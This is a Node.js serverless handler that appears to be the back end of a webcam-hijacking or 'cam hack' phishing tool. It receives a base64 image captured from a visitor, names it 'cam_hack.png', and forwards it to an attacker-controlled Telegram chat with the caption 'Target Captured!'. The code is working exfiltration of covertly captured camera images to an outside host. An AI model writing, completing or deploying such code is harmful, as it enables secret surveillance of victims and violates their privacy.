import FormData from 'form-data';
import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { image } = req.body;
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Env Vars Missing' });

    try {
        // Base64 to Buffer
        const base64Data = image.replace(/^data:image\/png;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        // Prepare for Telegram
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'cam_hack.png' });
        form.append('caption', '⚠️ C9 UZAIR SYSTEM: Target Captured!');

        // Send
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        if (tgRes.ok) res.status(200).json({ success: true });
        else res.status(500).json({ error: 'Telegram Failed' });

    } catch (e) {
        res.status(500).json({ error: e.message });
    }
}
